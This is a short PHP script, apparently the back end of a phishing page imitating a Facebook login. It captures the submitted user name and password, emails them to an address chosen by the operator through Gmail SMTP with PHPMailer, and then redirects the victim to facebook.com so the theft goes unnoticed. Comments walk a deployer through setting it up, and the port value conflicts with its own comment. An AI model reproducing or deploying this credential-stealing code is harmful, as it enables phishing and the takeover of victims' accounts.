<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';

$mail = new PHPMailer(true);
$alert = '';

if(isset($_POST['submit'])){
  $name = $_POST['name'];
  $password = $_POST['password'];


  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = ' '; // Gmail address which you want to use as SMTP server
    $mail->Password = ' '; // Gmail address Password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '567'; //use port number '587'  or '301' if it doesn't work

    $mail->setFrom(' '); // Gmail address which you used as SMTP server
    $mail->addAddress(' '); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)

    $mail->isHTML(true);
    $mail->Subject = ' ';
    $mail->Body = "<h3>user name : $name <br>Password: $password </h3>";

    $mail->send();
 
  } catch (Exception $e){
    $alert = '<div class="alert-error">
                <span>'.$e->getMessage().'</span>
              </div>';
  }
}

header("Location: https://www.facebook.com/", true, 301);

?>
